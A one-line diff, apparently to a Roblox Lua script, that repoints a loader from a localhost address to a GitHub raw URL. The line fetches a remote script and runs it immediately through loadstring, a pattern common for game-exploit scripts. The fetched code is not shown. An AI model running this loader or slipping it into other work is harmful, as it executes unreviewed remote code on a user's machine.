@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://127.0.0.1:8080/x.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nubdev2001/roblox-script/refs/heads/main/scripts/main.lua"))()
